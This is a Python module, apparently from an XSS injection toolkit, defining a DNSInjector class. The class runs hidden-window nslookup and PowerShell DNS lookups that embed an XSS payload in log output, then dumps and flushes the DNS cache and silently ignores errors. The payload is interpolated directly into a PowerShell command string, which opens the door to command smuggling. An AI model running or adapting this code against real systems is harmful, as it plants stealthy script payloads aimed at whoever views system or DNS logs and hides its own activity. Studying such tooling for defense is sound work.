"""DNS query XSS injection."""

import subprocess
from .base import BaseInjector
from ..payloads import XSSPayload


class DNSInjector(BaseInjector):
    """Injects XSS payloads via DNS queries."""
    
    def inject(self, payload: XSSPayload):
        """Execute DNS queries with XSS markers."""
        domains = [
            "google.com",
            "microsoft.com",
            "cloudflare.com",
        ]
        
        for domain in domains:
            try:
                # nslookup
                subprocess.Popen(
                    ["nslookup", domain],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                # PowerShell Resolve-DnsName with XSS context
                ps_cmd = f"""
Resolve-DnsName -Name {domain} -Type A -ErrorAction SilentlyContinue
Write-Host 'DNS Test: {payload.content}'
"""
                subprocess.Popen(
                    ["powershell.exe", "-Command", ps_cmd],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except Exception:
                pass
        
        # ipconfig commands
        try:
            subprocess.Popen(
                ["ipconfig", "/displaydns"],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            subprocess.Popen(
                ["ipconfig", "/flushdns"],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception:
            pass
